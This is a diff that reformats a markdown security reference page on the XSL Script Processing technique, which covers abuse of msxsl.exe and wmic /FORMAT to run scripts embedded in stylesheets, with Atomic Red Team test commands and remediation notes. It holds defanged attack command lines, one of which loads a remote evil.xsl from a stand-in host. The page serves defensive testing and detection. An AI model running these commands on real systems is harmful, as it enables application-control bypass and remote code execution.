@@ -21,10 +21,8 @@ tech_stack:
   - windows
 cwe_ids:
   - CWE-693
-chains_with:
-  []
-prerequisites:
-  []
+chains_with: []
+prerequisites: []
 severity_boost: {}
 ---
 
@@ -32,22 +30,22 @@ severity_boost: {}
 
 ## High-Level Description
 
-Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. 
+Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.
 
 Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.
 
 Command-line examples:
 
-* <code>msxsl.exe customers[.]xml script[.]xsl</code>
-* <code>msxsl.exe script[.]xsl script[.]xsl</code>
-* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>
+- <code>msxsl.exe customers[.]xml script[.]xsl</code>
+- <code>msxsl.exe script[.]xsl script[.]xsl</code>
+- <code>msxsl.exe script[.]jpeg script[.]jpeg</code>
 
 Another variation of this technique, dubbed “Squiblytwo”, involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file. This technique can also execute local/remote scripts and, similar to its Regsvr32/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the /FORMAT switch.
 
 Command-line examples:
 
-* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
-* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>
+- Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
+- Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>
 
 ## Kill Chain Phase
 
@@ -70,9 +68,9 @@ The following tests are from [Atomic Red Team](https://github.com/redcanaryco/at
 
 ### Atomic Test 1: MSXSL Bypass using local files
 
-Executes the code specified within a XSL script tag during XSL transformation using a local payload. 
+Executes the code specified within a XSL script tag during XSL transformation using a local payload.
 Requires download of MSXSL. No longer available from Microsoft.
-(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) 
+(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )
 Open Calculator.exe when test successfully executed, while AV turned off.
 
 **Supported Platforms:** windows
@@ -82,6 +80,7 @@ Open Calculator.exe when test successfully executed, while AV turned off.
 ```
 
 **Dependencies:**
+
 - XML file must exist on disk at specified location (#{xmlfile})
 - XSL file must exist on disk at specified location (#{xslfile})
 - msxsl.exe must exist on disk at specified location (#{msxsl_exe})
@@ -100,6 +99,7 @@ Open Calculator.exe when test successfully executed, while AV turned off.
 ```
 
 **Dependencies:**
+
 - msxsl.exe must exist on disk at specified location ("#{msxsl_exe}")
 
 ### Atomic Test 3: WMIC bypass using local XSL file
@@ -113,6 +113,7 @@ wmic #{wmic_command} /FORMAT:"#{local_xsl_file}"
 ```
 
 **Dependencies:**
+
 - XSL file must exist on disk at specified location (#{local_xsl_file})
 
 ### Atomic Test 4: WMIC bypass using remote XSL file
@@ -124,7 +125,6 @@ Executes the code specified within a XSL script using a remote payload. Open Cal
 ```cmd
 wmic #{wmic_command} /FORMAT:"#{remote_xsl_file}"
 ```
-
 
 ### Manual Testing
 
@@ -139,26 +139,24 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1038 Execution Prevention
-If msxsl.exe is unnecessary, then block its execution to prevent abuse by adversaries.
 
+If msxsl.exe is unnecessary, then block its execution to prevent abuse by adversaries.
 
 ## Detection
 
 ### Detect XSL Script Abuse via msxsl and wmic
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| XSL Script Processing technique applicable | High | Defense Evasion |
+| Finding                                    | Severity | Impact          |
+| ------------------------------------------ | -------- | --------------- |
+| XSL Script Processing technique applicable | High     | Defense Evasion |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                        |
+| ------- | ---------------------------- |
 | CWE-693 | Protection Mechanism Failure |
-
 
 ## References
 
